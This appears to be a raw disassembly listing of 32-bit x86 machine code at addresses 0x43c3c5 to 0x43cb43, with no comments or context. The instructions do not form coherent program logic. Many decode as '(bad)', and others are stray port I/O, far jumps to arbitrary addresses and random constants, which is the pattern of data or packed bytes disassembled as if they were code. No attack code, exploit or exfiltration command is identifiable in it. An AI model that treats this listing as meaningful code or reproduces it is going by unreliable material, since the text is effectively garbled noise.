  43c3c5:	adc    DWORD PTR [eax],esi
  43c3c7:	mov    ecx,0xe32f6aee
  43c3cc:	and    edi,DWORD PTR [edx]
  43c3ce:	or     al,0x4a
  43c3d0:	mov    BYTE PTR [ebp+0x7b043ed6],al
  43c3d6:	les    ebx,FWORD PTR [ecx+0x4a68028c]
  43c3dc:	mov    ebp,0x5b3c76e1
  43c3e1:	loope  0x43c443
  43c3e3:	dec    ebx
  43c3e4:	jns    0x43c415
  43c3e6:	xchg   ebp,eax
  43c3e7:	push   eax
  43c3e8:	add    al,0x68
  43c3ea:	cli    
  43c3eb:	aad    0x87
  43c3ed:	outs   dx,BYTE PTR ds:[esi]
  43c3ee:	xor    edi,DWORD PTR [ecx]
  43c3f0:	daa    
  43c3f1:	adc    ecx,esp
  43c3f3:	adc    BYTE PTR [eax-0x41757063],cl
  43c3f9:	or     ch,BYTE PTR [edx]
  43c3fb:	mov    ch,dl
  43c3fd:	add    dh,BYTE PTR [eax]
  43c3ff:	cmp    BYTE PTR [esi+0x57a6af1b],bh
  43c405:	add    DWORD PTR [ebp-0x43fa1825],edx
  43c40b:	nop
  43c40c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43c40d:	shl    BYTE PTR [ebx+esi*2-0x1035fdb6],0x82
  43c415:	mov    al,ds:0xfaac2bda
  43c41a:	pop    ds
  43c41b:	adc    esi,DWORD PTR [ebp-0x55]
  43c41e:	gs add esi,esp
  43c421:	shr    esi,1
  43c423:	aad    0xc6
  43c425:	and    eax,0x904e4107
  43c42a:	or     bh,BYTE PTR [ebx+0x4e29af89]
  43c430:	or     eax,0xbeb63e57
  43c435:	add    ecx,DWORD PTR [ebp+ebp*4+0x1f]
  43c439:	add    DWORD PTR [esp+ebp*2-0x3a],0xffffffb1
  43c43e:	and    al,dh
  43c440:	inc    esp
  43c441:	mov    ebx,0x7c04911f
  43c446:	enter  0x26b3,0x2e
  43c44a:	jbe    0x43c420
  43c44c:	push   edi
  43c44d:	sahf   
  43c44e:	cdq    
  43c44f:	or     BYTE PTR [esi-0x74f70374],ah
  43c455:	xchg   edi,eax
  43c456:	or     DWORD PTR [ecx-0x18a441d0],ecx
  43c45c:	sbb    BYTE PTR [ecx+0x77],ch
  43c45f:	push   ebp
  43c460:	and    DWORD PTR [edx+0x52],eax
  43c463:	cs std 
  43c465:	out    dx,al
  43c466:	jge    0x43c403
  43c468:	out    0xa4,eax
  43c46a:	lock stc 
  43c46c:	inc    esp
  43c46d:	add    ebp,DWORD PTR ds:0xd26fb52c
  43c473:	pop    ebx
  43c474:	ror    BYTE PTR [eax+eiz*2-0x7516f537],1
  43c47b:	scas   eax,DWORD PTR es:[edi]
  43c47c:	inc    edi
  43c47d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  43c47e:	pop    ds
  43c47f:	xlat   BYTE PTR ds:[ebx]
  43c480:	mov    bh,0x67
  43c482:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  43c483:	out    dx,eax
  43c484:	inc    edi
  43c485:	ror    ch,1
  43c487:	mov    ch,0x42
  43c489:	sbb    eax,0xa2e8f5ac
  43c48e:	pop    ecx
  43c48f:	cmovs  ebx,DWORD PTR [ebp-0x4669353a]
  43c496:	imul   ebp,DWORD PTR [esi],0x89fbc07d
  43c49c:	loop   0x43c45e
  43c49e:	xlat   BYTE PTR ds:[ebx]
  43c49f:	sbb    al,0x52
  43c4a1:	add    eax,DWORD PTR [ebx+ebp*1+0x2c68ed8c]
  43c4a8:	stos   BYTE PTR es:[edi],al
  43c4a9:	jp     0x43c4a1
  43c4ab:	daa    
  43c4ac:	xor    eax,0x9cc3be00
  43c4b1:	push   esi
  43c4b2:	add    DWORD PTR [eax+ebp*8+0x5],ebp
  43c4b6:	js     0x43c48d
  43c4b8:	pusha  
  43c4b9:	cmp    bh,ch
  43c4bb:	mov    ds:0xde0b0424,al
  43c4c0:	cmp    DWORD PTR [edi+edi*4],esi
  43c4c3:	int    0x88
  43c4c5:	loope  0x43c476
  43c4c7:	push   ss
  43c4c8:	stos   DWORD PTR es:[edi],eax
  43c4c9:	xor    cl,BYTE PTR [edx]
  43c4cb:	sbb    DWORD PTR [ecx],0x3
  43c4ce:	and    dl,ah
  43c4d0:	push   edi
  43c4d1:	jecxz  0x43c50a
  43c4d3:	lea    ecx,[ebx]
  43c4d5:	mov    edi,0x43445d5d
  43c4da:	ins    DWORD PTR es:[edi],dx
  43c4db:	add    ch,0x6a
  43c4de:	(bad)  
  43c4df:	mov    ebx,0xd4e0f81a
  43c4e4:	cs cld 
  43c4e6:	ret    0x3e00
  43c4e9:	cdq    
  43c4ea:	fwait
  43c4eb:	inc    ebx
  43c4ec:	mov    DWORD PTR [edi+0x43],ecx
  43c4ef:	scas   al,BYTE PTR es:[edi]
  43c4f0:	or     dh,BYTE PTR [ebx+0x2e]
  43c4f3:	or     eax,0xd5d7f5f6
  43c4f8:	add    DWORD PTR [edx+0x33c52820],eax
  43c4fe:	or     al,0x3a
  43c500:	mov    esp,DWORD PTR [edi]
  43c502:	repz rcl BYTE PTR [edx],0x21
  43c506:	or     eax,0x9dca8979
  43c50b:	in     al,0xbf
  43c50d:	scas   al,BYTE PTR es:[edi]
  43c50e:	xchg   ebp,eax
  43c50f:	inc    edi
  43c510:	xchg   edi,eax
  43c511:	mov    bh,0xd0
  43c513:	ins    BYTE PTR es:[edi],dx
  43c514:	adc    BYTE PTR [ecx],al
  43c516:	jge    0x43c4e1
  43c518:	test   al,0xe8
  43c51a:	out    0xb4,eax
  43c51c:	xlat   BYTE PTR ds:[ebx]
  43c51d:	sbb    dh,BYTE PTR [esi-0x458942c4]
  43c523:	aad    0x7d
  43c525:	je     0x43c4d9
  43c527:	aad    0x88
  43c529:	jno    0x43c54e
  43c52b:	inc    esp
  43c52c:	or     dl,BYTE PTR fs:[ebx]
  43c52f:	retf   0x2982
  43c532:	out    dx,al
  43c533:	popa   
  43c534:	vpavgb ymm0,ymm5,YMMWORD PTR [ecx+0x168092a7]
  43c53c:	mov    BYTE PTR [ecx-0xd3ea9ca],ch
  43c542:	out    0xb0,eax
  43c544:	test   DWORD PTR ds:0x15eec9ba,0xd26e24c0
  43c54e:	pop    ds
  43c54f:	lea    esp,[eax-0x7c]
  43c552:	shr    BYTE PTR [eax+edi*2+0xad72020],cl
  43c559:	mov    bh,0xc7
  43c55b:	clc    
  43c55c:	push   0x88e61d72
  43c561:	mov    ds:0xbf41617f,eax
  43c566:	sbb    edx,ebx
  43c568:	rol    BYTE PTR ds:0x4a8bf26a,1
  43c56e:	push   0x1fb9ebaf
  43c573:	aas    
  43c574:	into   
  43c575:	into   
  43c576:	mov    dh,BYTE PTR [ebx-0x2a154558]
  43c57c:	xchg   ecx,eax
  43c57d:	(bad)  
  43c57e:	hlt    
  43c57f:	in     al,0x21
  43c581:	fdiv   QWORD PTR [ebp+0xdc38889]
  43c587:	nop
  43c588:	xlat   BYTE PTR ds:[ebx]
  43c589:	cld    
  43c58a:	inc    ecx
  43c58b:	sahf   
  43c58c:	out    0x1c,eax
  43c58e:	or     al,0x1
  43c590:	ret    0x8de
  43c593:	or     BYTE PTR [ecx],0xcd
  43c596:	not    ch
  43c598:	mov    DWORD PTR ds:0x7f73e32a,esp
  43c59e:	or     eax,0x8802b4c2
  43c5a3:	es add eax,0x5c1ce9e4
  43c5a9:	aas    
  43c5aa:	push   ds
  43c5ab:	out    0x62,eax
  43c5ad:	das    
  43c5ae:	dec    ecx
  43c5af:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  43c5b0:	mov    dl,BYTE PTR ds:0x8e82d70f
  43c5b6:	repnz mov edx,0x9cae688e
  43c5bc:	mov    esi,DWORD PTR [edi]
  43c5be:	clc    
  43c5bf:	in     al,0xd1
  43c5c1:	jo     0x43c5df
  43c5c3:	pop    edi
  43c5c4:	or     BYTE PTR [ebx+0x52],dl
  43c5c7:	ror    BYTE PTR [ebx-0x30cd7754],1
  43c5cd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  43c5ce:	and    BYTE PTR [edi+0x49],bl
  43c5d1:	neg    BYTE PTR [edi]
  43c5d3:	out    0x3b,eax
  43c5d5:	les    ebp,FWORD PTR [ebx]
  43c5d7:	fistp  QWORD PTR [esi-0x68295f7e]
  43c5dd:	addr16 cmp eax,0x102d116e
  43c5e3:	sahf   
  43c5e4:	fs es lahf 
  43c5e7:	jmp    0x43c577
  43c5e9:	gs add eax,0xde13fcc9
  43c5ef:	call   DWORD PTR [ecx]
  43c5f1:	push   esp
  43c5f2:	push   ds
  43c5f3:	mov    edi,0x2d784a62
  43c5f8:	mov    ebp,DWORD PTR [ecx+0x6d2f816f]
  43c5fe:	xchg   ecx,eax
  43c600:	or     BYTE PTR [ecx-0x33],cl
  43c603:	mov    eax,0xfc9a3b8c
  43c608:	mov    edx,esi
  43c60a:	in     eax,dx
  43c60b:	cmp    eax,ebx
  43c60d:	ins    DWORD PTR es:[edi],dx
  43c60e:	push   ds
  43c60f:	leave  
  43c610:	xchg   ebx,eax
  43c611:	inc    DWORD PTR [edi+0x71]
  43c614:	das    
  43c615:	or     ebp,DWORD PTR [ecx+0x46]
  43c618:	(bad)  
  43c619:	fs pushf 
  43c61b:	clc    
  43c61c:	mov    BYTE PTR [edx-0x6f111ae2],ah
  43c622:	(bad)  
  43c623:	in     eax,dx
  43c624:	mov    ch,BYTE PTR [ecx]
  43c626:	pop    esp
  43c627:	cmp    ch,ah
  43c629:	cmp    dh,BYTE PTR [edx-0x51]
  43c62c:	or     ebp,ebp
  43c62e:	mov    ebx,ds
  43c630:	and    DWORD PTR [edx],eax
  43c632:	outs   dx,BYTE PTR ds:[esi]
  43c633:	dec    esp
  43c634:	clc    
  43c635:	test   BYTE PTR [ebp+0x27],bh
  43c638:	push   ebx
  43c639:	test   DWORD PTR [eax+0x6f],esp
  43c63c:	jno    0x43c69d
  43c63e:	mov    bh,0xe9
  43c640:	push   cs
  43c641:	mov    BYTE PTR [esi-0x6349102a],bh
  43c647:	xabort 0xd5
  43c64a:	inc    edi
  43c64b:	sbb    al,0x27
  43c64d:	imul   BYTE PTR [edi+0x1f12b1b3]
  43c653:	push   ebx
  43c654:	adc    eax,DWORD PTR [edx+eiz*2-0x57]
  43c658:	push   esi
  43c659:	retf   0xd54c
  43c65c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43c65d:	push   0xffffffd7
  43c65f:	inc    ebp
  43c660:	scas   eax,DWORD PTR es:[edi]
  43c661:	adc    DWORD PTR [ecx-0x37a4775d],0xffffffc8
  43c668:	pop    ebx
  43c669:	ds pop esp
  43c66b:	shl    DWORD PTR [esi-0xfde5400],cl
  43c671:	pop    esi
  43c672:	add    eax,0xeda8777
  43c677:	sbb    ecx,DWORD PTR [eax+0x39236345]
  43c67d:	dec    ebx
  43c67e:	and    eax,0xfa02bc6c
  43c683:	sbb    BYTE PTR [ebp+0x21],bh
  43c686:	xor    DWORD PTR [esi+edx*1],ecx
  43c689:	sub    BYTE PTR [ebp+0x6d],ah
  43c68c:	rcl    DWORD PTR ds:0x72cdd01b,cl
  43c692:	cmc    
  43c693:	inc    eax
  43c694:	repz add eax,0xcb5b868a
  43c69a:	adc    DWORD PTR [edi+0x5b],edx
  43c69d:	pusha  
  43c69e:	pusha  
  43c69f:	dec    ecx
  43c6a0:	call   0x1e9f4ff8
  43c6a5:	outs   dx,DWORD PTR ds:[esi]
  43c6a6:	(bad)  
  43c6a7:	push   esi
  43c6a8:	and    DWORD PTR [ebx],eax
  43c6aa:	sbb    al,0xd5
  43c6ac:	push   edi
  43c6ad:	push   0x5
  43c6af:	jp     0x43c70e
  43c6b1:	cmp    al,0x1e
  43c6b3:	int    0x8b
  43c6b5:	loopne 0x43c6c5
  43c6b7:	push   0x5e
  43c6b9:	scas   al,BYTE PTR es:[edi]
  43c6ba:	pop    esp
  43c6bb:	aam    0xf7
  43c6bd:	adc    cl,dl
  43c6bf:	sbb    DWORD PTR [esi-0x6c],eax
  43c6c2:	sub    ecx,esp
  43c6c4:	xchg   BYTE PTR [edi+0x60],bl
  43c6c7:	dec    edi
  43c6c8:	jnp    0x43c725
  43c6ca:	sahf   
  43c6cb:	xchg   BYTE PTR [edx],al
  43c6cd:	sub    al,0xeb
  43c6cf:	aam    0x1d
  43c6d1:	mov    ds,WORD PTR [edi+0x456adb15]
  43c6d7:	jnp    0x43c69e
  43c6d9:	sub    ebp,DWORD PTR [eax]
  43c6db:	push   edi
  43c6dc:	mov    BYTE PTR [ebx-0x47],cl
  43c6df:	sete   BYTE PTR [edx+0x3e]
  43c6e3:	aam    0x84
  43c6e5:	int    0xe8
  43c6e7:	clc    
  43c6e8:	cmp    ecx,0x41c1355a
  43c6ee:	pop    edi
  43c6ef:	int    0x89
  43c6f1:	or     esi,edx
  43c6f3:	cmp    eax,0xd5a96a0e
  43c6f8:	test   BYTE PTR [eax],dh
  43c6fa:	fwait
  43c6fb:	sbb    DWORD PTR [ebx],ebx
  43c6fd:	cwde   
  43c6fe:	inc    ebp
  43c6ff:	dec    ebx
  43c700:	(bad)  
  43c701:	or     edx,DWORD PTR [ebx+0x9]
  43c704:	xchg   esp,eax
  43c705:	add    eax,0x6d49f6a2
  43c70a:	inc    edx
  43c70b:	xor    al,0x86
  43c70d:	cmc    
  43c70e:	and    al,0x6
  43c710:	ds adc dh,bh
  43c713:	sub    eax,0xd41780f2
  43c718:	xor    al,0xda
  43c71a:	cwde   
  43c71b:	or     bl,ch
  43c71d:	fsub   QWORD PTR [di]
  43c720:	je     0x43c6a4
  43c722:	pop    ds
  43c723:	sbb    DWORD PTR [bp+0x32],0x53
  43c728:	(bad)  
  43c729:	xchg   edi,eax
  43c72a:	repz popf 
  43c72c:	fsubr  DWORD PTR [ecx+ebx*2+0x55]
  43c730:	imul   eax,DWORD PTR [ebp+0x53],0xfffffff1
  43c734:	out    0xb3,al
  43c736:	pusha  
  43c737:	(bad)  
  43c739:	jecxz  0x43c6c0
  43c73b:	jmp    0x43c6e6
  43c73d:	loope  0x43c6e7
  43c73f:	inc    eax
  43c740:	pop    esi
  43c741:	repz jne 0x43c7a8
  43c744:	mov    ch,0xd5
  43c746:	pop    ds
  43c747:	cmp    esi,DWORD PTR [ecx-0x742e6d7b]
  43c74d:	imul   esp,edx,0x2f
  43c750:	sbb    eax,0x60c21ef8
  43c755:	xchg   ebx,eax
  43c756:	hlt    
  43c757:	aam    0x7e
  43c759:	jge    0x43c707
  43c75b:	cmp    al,0xaa
  43c75d:	retf   
  43c75e:	push   edx
  43c75f:	loop   0x43c6e9
  43c761:	push   ebx
  43c762:	or     edi,DWORD PTR [ebx-0x7d]
  43c765:	jnp    0x43c6fb
  43c767:	pusha  
  43c768:	xchg   edi,eax
  43c769:	add    eax,0x85ff8fac
  43c76e:	add    BYTE PTR [ebp-0x58e0abc0],0x1c
  43c775:	pushf  
  43c776:	dec    ebp
  43c777:	mov    bl,0xa4
  43c779:	push   ebx
  43c77a:	pop    ss
  43c77b:	mov    edx,0x2191d6c2
  43c780:	dec    ecx
  43c781:	inc    edx
  43c782:	sbb    ebp,DWORD PTR [ecx+0x471fa6ec]
  43c788:	add    DWORD PTR [edx],edx
  43c78a:	retf   0x4e3e
  43c78d:	inc    esp
  43c78e:	mov    eax,ds:0xde5fa6d5
  43c793:	adc    edi,DWORD PTR [edi]
  43c795:	xlat   BYTE PTR cs:[ebx]
  43c797:	mov    eax,0x9a37b89
  43c79c:	jmp    0xda4a085b
  43c7a1:	ret    0xa92a
  43c7a4:	jo     0x43c7c6
  43c7a6:	inc    ecx
  43c7a7:	add    DWORD PTR [eax-0x64],eax
  43c7aa:	faddp  st(4),st
  43c7ac:	(bad)  
  43c7ae:	cmc    
  43c7af:	xor    eax,0x71a62dda
  43c7b4:	and    ah,BYTE PTR [ecx+0x64]
  43c7b7:	mov    ebx,0x33eb22d0
  43c7bc:	aaa    
  43c7bd:	arpl   cx,di
  43c7bf:	or     bl,dl
  43c7c1:	xchg   esp,eax
  43c7c2:	mov    esi,ds
  43c7c4:	outs   dx,DWORD PTR ds:[esi]
  43c7c5:	bound  eax,QWORD PTR [edi]
  43c7c7:	pop    ss
  43c7c8:	inc    esi
  43c7c9:	mov    eax,ds:0x9a21f9bf
  43c7ce:	add    BYTE PTR [ecx+0x12],ah
  43c7d1:	add    bh,BYTE PTR [eax]
  43c7d3:	ret    0x9d8a
  43c7d6:	fsubr  DWORD PTR [ebx]
  43c7d8:	xor    eax,0x52dd2497
  43c7dd:	or     esi,esp
  43c7df:	pop    es
  43c7e0:	mov    BYTE PTR [edi+0x7aa40072],bl
  43c7e6:	data16 jl 0x43c839
  43c7e9:	adc    al,0x3c
  43c7eb:	mov    eax,ds:0xb47d990c
  43c7f0:	fidivr WORD PTR [ebx-0x33]
  43c7f3:	xchg   edi,eax
  43c7f4:	mov    ecx,edx
  43c7f6:	jmp    0x43c7c9
  43c7f8:	push   ebx
  43c7f9:	mov    bl,0xb1
  43c7fb:	cwde   
  43c7fc:	push   ebp
  43c7fd:	sbb    al,0x62
  43c7ff:	xor    DWORD PTR [ebp-0x29],ecx
  43c802:	shl    BYTE PTR [eax-0x67],0xba
  43c806:	pop    ds
  43c807:	(bad)  
  43c808:	mov    bh,bh
  43c80a:	adc    DWORD PTR [edi],esp
  43c80c:	xchg   ecx,eax
  43c80d:	xchg   esi,eax
  43c80e:	inc    edi
  43c80f:	push   eax
  43c810:	dec    eax
  43c811:	dec    edx
  43c812:	shr    dh,1
  43c814:	sbb    BYTE PTR [edi+0x3245f213],0x7e
  43c81b:	(bad)  
  43c81d:	xor    ebx,DWORD PTR [esi]
  43c81f:	xor    eax,0x8504a4ba
  43c824:	mov    esp,0xcd4f75d
  43c829:	(bad)  
  43c82a:	jecxz  0x43c828
  43c82c:	test   al,0xd3
  43c82e:	jmp    0xf6bd:0x90038f12
  43c835:	(bad)  
  43c836:	jl     0x43c83d
  43c838:	jmp    0x43c8af
  43c83a:	cld    
  43c83b:	int3   
  43c83c:	imul   ebx,DWORD PTR [esp+ebx*1],0x5c5f96ce
  43c843:	call   0xaf30df81
  43c848:	popa   
  43c849:	or     esp,DWORD PTR [eax+0x59]
  43c84c:	adc    ebp,DWORD PTR [edx+0x5f4adc1b]
  43c852:	clc    
  43c853:	aam    0x6a
  43c855:	dec    eax
  43c856:	div    BYTE PTR [eax-0x40]
  43c859:	imul   DWORD PTR [edx+0x2f8389b6]
  43c85f:	and    eax,0x51da739
  43c864:	fild   WORD PTR ds:0x42982850
  43c86a:	dec    ebx
  43c86b:	loope  0x43c8d5
  43c86d:	push   eax
  43c86e:	push   ds
  43c86f:	aas    
  43c870:	mov    edi,0x5cc14993
  43c875:	scas   al,BYTE PTR es:[edi]
  43c876:	mov    esp,0xd560879b
  43c87b:	sub    esi,DWORD PTR [eax]
  43c87d:	jbe    0x43c88f
  43c87f:	xchg   esp,eax
  43c880:	or     eax,0x8f2c5331
  43c885:	mov    edi,0x3c056c3
  43c88a:	(bad)  
  43c88b:	and    eax,0xd4821726
  43c890:	cwde   
  43c891:	push   0x8f4e8fca
  43c896:	pushf  
  43c897:	fimul  DWORD PTR [ecx+0x49d99931]
  43c89d:	xchg   ebx,eax
  43c89e:	push   0xf024239b
  43c8a3:	and    bl,dh
  43c8a5:	ficomp WORD PTR [edi-0x57]
  43c8a8:	mov    edx,0x5861e5dd
  43c8ad:	lea    ebp,[ecx+0x79]
  43c8b0:	into   
  43c8b1:	stc    
  43c8b2:	xor    al,0x22
  43c8b4:	mov    BYTE PTR [edx+ecx*4-0x5b],ah
  43c8b8:	fild   WORD PTR ds:0xddf0375c
  43c8be:	mov    al,0x56
  43c8c0:	adc    BYTE PTR [eax+0x1f],ch
  43c8c3:	sub    eax,0xbe2bcb15
  43c8c8:	cmp    al,0x27
  43c8ca:	or     esp,edx
  43c8cc:	jg     0x43c8ed
  43c8ce:	pop    es
  43c8cf:	arpl   dx,si
  43c8d1:	jo     0x43c93e
  43c8d3:	mov    DWORD PTR ss:[ebp+0x67],eax
  43c8d7:	js     0x43c921
  43c8d9:	and    DWORD PTR [ebx+eiz*4-0x2b2b1dde],ebp
  43c8e0:	pop    edx
  43c8e1:	js     0x43c8a3
  43c8e3:	scas   eax,DWORD PTR es:[edi]
  43c8e4:	pop    esi
  43c8e5:	or     bh,BYTE PTR [ebp-0x2a]
  43c8e8:	xchg   DWORD PTR [ebx],esi
  43c8ea:	mov    edx,0xde2332d0
  43c8ef:	(bad)  
  43c8f0:	sbb    bh,BYTE PTR [eax-0x3fae2b35]
  43c8f6:	ja     0x43c96e
  43c8f8:	jnp    0x43c8be
  43c8fa:	inc    ecx
  43c8fb:	mov    ecx,0x33b5a788
  43c900:	out    dx,eax
  43c901:	out    dx,al
  43c902:	cmp    al,0x2c
  43c904:	sbb    al,BYTE PTR [ebx]
  43c906:	sar    BYTE PTR [eax],cl
  43c908:	fwait
  43c909:	mov    esp,0xedbf5aa9
  43c90e:	pop    ds
  43c90f:	jne    0x43c969
  43c911:	sub    BYTE PTR [esi],dl
  43c913:	sbb    edx,DWORD PTR [esp+eiz*4+0x7d]
  43c917:	lahf   
  43c918:	push   0x2b
  43c91a:	mov    al,ds:0x8eabd855
  43c91f:	xor    esi,DWORD PTR [ebp+0x5f037d8c]
  43c925:	(bad)  
  43c926:	bound  edx,QWORD PTR [ecx+edi*2-0x7fbb8351]
  43c92d:	add    dl,dl
  43c92f:	mov    ebx,0xa973a305
  43c934:	(bad)  
  43c935:	xchg   esi,eax
  43c936:	pop    ds
  43c937:	dec    ecx
  43c938:	imul   edi,eax,0xffffffa2
  43c93b:	mov    esi,0xd5f7b5ae
  43c940:	cdq    
  43c941:	pop    edx
  43c942:	sti    
  43c943:	inc    eax
  43c944:	in     eax,dx
  43c945:	cmp    eax,0xb588ad7c
  43c94a:	enter  0x9e82,0xcf
  43c94e:	cmp    BYTE PTR [ebx-0x79],ch
  43c951:	add    eax,0x73fe2a76
  43c956:	mov    bl,0x23
  43c958:	and    eax,0xc0351fea
  43c95d:	int    0x8d
  43c95f:	iret   
  43c960:	adc    al,0x38
  43c962:	data16 xlat BYTE PTR ds:[ebx]
  43c964:	ror    DWORD PTR [ecx],cl
  43c966:	mov    al,0x28
  43c968:	je     0x43c930
  43c96a:	mov    ebx,0x1f988f54
  43c96f:	pop    ebp
  43c970:	ins    DWORD PTR es:[edi],dx
  43c971:	call   0xd58e:0xab1c42cf
  43c978:	cwde   
  43c979:	jbe    0x43c91c
  43c97b:	iret   
  43c97c:	dec    eax
  43c97d:	dec    esi
  43c97e:	jecxz  0x43c905
  43c980:	mov    DWORD PTR [ebx-0x5a96467c],ebx
  43c986:	or     eax,0xc22646f0
  43c98b:	inc    ebx
  43c98c:	test   BYTE PTR [eax],bh
  43c98e:	sahf   
  43c98f:	adc    esp,DWORD PTR ds:0x8987f03d
  43c995:	sub    eax,0x5d91f2a5
  43c99a:	stc    
  43c99b:	out    dx,al
  43c99c:	jno    0x43c9a0
  43c99e:	fdivr  DWORD PTR [edi]
  43c9a0:	sub    cl,BYTE PTR [ecx]
  43c9a2:	mov    DWORD PTR [ebx+0x6a],0x2dad5eb5
  43c9a9:	mov    al,0x1f
  43c9ab:	adc    esi,esi
  43c9ad:	pop    edi
  43c9ae:	mov    ch,cl
  43c9b0:	inc    esi
  43c9b1:	idiv   DWORD PTR [edi+0x54a004d4]
  43c9b7:	or     DWORD PTR [ecx-0x3a21d810],edx
  43c9bd:	scas   eax,DWORD PTR es:[edi]
  43c9be:	jmp    FWORD PTR [ecx]
  43c9c0:	mov    DWORD PTR [ebx],ebx
  43c9c2:	mov    ch,0xb
  43c9c4:	(bad)  
  43c9c5:	jg     0x43c9cf
  43c9c7:	aam    0x45
  43c9c9:	jle    0x43c95d
  43c9cb:	test   eax,0x89df5dd7
  43c9d0:	jno    0x43c968
  43c9d2:	pop    ds
  43c9d3:	(bad)  
  43c9d5:	ss hlt 
  43c9d7:	(bad)  
  43c9d8:	ror    bl,1
  43c9da:	ret    0x5dd4
  43c9dd:	push   ecx
  43c9de:	cli    
  43c9df:	add    bh,cl
  43c9e1:	dec    edx
  43c9e2:	add    bh,BYTE PTR [esi-0x17]
  43c9e5:	ficomp DWORD PTR [edi]
  43c9e7:	das    
  43c9e8:	and    al,0xe7
  43c9ea:	inc    esp
  43c9eb:	scas   eax,DWORD PTR es:[edi]
  43c9ec:	xchg   esi,eax
  43c9ed:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  43c9ee:	test   eax,0xffb2d1d4
  43c9f3:	call   0xe788:0xb2f01315
  43c9fa:	or     DWORD PTR [eax+0x32e95277],0xffffffa5
  43ca01:	add    dh,BYTE PTR [eax-0x40994332]
  43ca07:	jmp    0x43ca34
  43ca09:	mov    ds:0x46225160,eax
  43ca0e:	shl    BYTE PTR [ecx-0x4c],0xc0
  43ca12:	push   cs
  43ca13:	aam    0xb2
  43ca15:	dec    esp
  43ca16:	loopne 0x43ca8f
  43ca18:	and    eax,0xc9cc391c
  43ca1d:	adc    BYTE PTR ds:0x5b058f7c,al
  43ca23:	xor    al,BYTE PTR [edi]
  43ca25:	sbb    BYTE PTR [esi-0x2b],ch
  43ca28:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43ca29:	sahf   
  43ca2a:	sbb    edx,edi
  43ca2c:	adc    ch,ch
  43ca2e:	sub    DWORD PTR [ecx],edx
  43ca30:	fwait
  43ca31:	test   eax,0xff866879
  43ca36:	push   esp
  43ca37:	jbe    0x43ca35
  43ca39:	lahf   
  43ca3a:	and    BYTE PTR [edx-0x2b0d9046],al
  43ca40:	js     0x43c9db
  43ca42:	std    
  43ca43:	cmp    BYTE PTR [ebx-0x20],cl
  43ca46:	ins    DWORD PTR es:[edi],dx
  43ca47:	xchg   DWORD PTR [eax-0x24322f1f],ecx
  43ca4d:	mov    edi,0x2913bd5
  43ca52:	jl     0x43ca2b
  43ca54:	test   al,0xb5
  43ca56:	sahf   
  43ca57:	(bad)  
  43ca59:	leave  
  43ca5a:	pusha  
  43ca5b:	addr16 (bad) 
  43ca5d:	aad    0x2b
  43ca5f:	jmp    0xa95a:0x5dee3de1
  43ca66:	pop    ds
  43ca67:	push   ss
  43ca68:	sub    al,0x7f
  43ca6a:	sar    cl,cl
  43ca6c:	mov    ah,0x41
  43ca6e:	push   ds
  43ca6f:	xchg   DWORD PTR [eax+ebx*4],eax
  43ca72:	shl    DWORD PTR [eax+ebx*2-0x30ba50e4],1
  43ca79:	add    eax,0x5465a5de
  43ca7e:	mov    ebx,0x1fcc1d52
  43ca83:	repz std 
  43ca85:	je     0x43caaf
  43ca87:	popf   
  43ca88:	je     0x43ca49
  43ca8a:	add    ah,dl
  43ca8c:	jo     0x43ca61
  43ca8e:	int3   
  43ca8f:	mov    ebp,0x59fa6bee
  43ca94:	mov    DWORD PTR [ebx],ebp
  43ca96:	add    bl,BYTE PTR [edi+edx*8]
  43ca99:	and    ebp,DWORD PTR [esi+0x20]
  43ca9c:	aad    0xe7
  43ca9e:	loop   0x43ca8e
  43caa0:	push   eax
  43caa1:	dec    ecx
  43caa2:	and    al,0xd4
  43caa4:	scas   al,BYTE PTR es:[edi]
  43caa5:	mov    dl,0x69
  43caa7:	popf   
  43caa8:	push   ss
  43caa9:	outs   dx,BYTE PTR ds:[esi]
  43caaa:	test   al,0xb9
  43caac:	jae    0x43ca80
  43caae:	inc    ebp
  43caaf:	inc    ebx
  43cab0:	dec    esi
  43cab1:	out    0x60,eax
  43cab3:	add    eax,0x946a326b
  43cab8:	fild   WORD PTR [edx]
  43caba:	mov    esi,0xbc53444e
  43cabf:	mov    edx,0xbd60f4cf
  43cac4:	mov    WORD PTR [edi],ds
  43cac6:	pop    esp
  43cac7:	mov    ds:0xd581bd20,al
  43cacc:	sub    ah,0xc0
  43cacf:	adc    BYTE PTR [edi+edx*8-0x27],0xb5
  43cad4:	mov    bh,0x5d
  43cad6:	adc    al,0x99
  43cad8:	or     bl,bh
  43cada:	scas   al,BYTE PTR es:[edi]
  43cadb:	jmp    0xb9bc9d6e
  43cae0:	mov    edx,0xbe0309f
  43cae5:	xchg   esi,eax
  43cae6:	mov    dh,0xb6
  43cae8:	cwde   
  43cae9:	fimul  DWORD PTR [eax+0x54]
  43caec:	mov    DWORD PTR [edi+0x4f4a0b59],ebp
  43caf2:	retf   
  43caf3:	inc    eax
  43caf4:	dec    ecx
  43caf5:	add    BYTE PTR [edx+0x41015449],ah
  43cafb:	js     0x43cab3
  43cafd:	adc    BYTE PTR [esi+eiz*8],0xc1
  43cb01:	mov    ds:0xaf89dafa,eax
  43cb06:	mov    dl,0xdd
  43cb08:	loopne 0x43caa5
  43cb0a:	xchg   ebp,eax
  43cb0b:	aam    0x6f
  43cb0d:	xor    dh,BYTE PTR [edi+edx*1+0x45fb7d96]
  43cb14:	add    BYTE PTR [edi-0x3b],0xf1
  43cb18:	ret    0x1ffa
  43cb1b:	xchg   DWORD PTR ds:[edx+ebp*8+0x1f4d401c],ecx
  43cb23:	(bad)
  43cb26:	push   ss
  43cb27:	pop    esp
  43cb28:	(bad)  
  43cb29:	call   FWORD PTR [eax-0x55]
  43cb2c:	add    eax,0x25fb60c3
  43cb31:	dec    eax
  43cb32:	push   ebx
  43cb33:	xor    al,0x5b
  43cb35:	add    bh,ah
  43cb37:	or     eax,0xfa853492
  43cb3c:	xchg   ebp,eax
  43cb3d:	pop    edi
  43cb3e:	fmulp  st(1),st
  43cb40:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  43cb41:	jbe    0x43cbb1
  43cb43:	fsub   QWORD PTR [esi+0x383a3395]
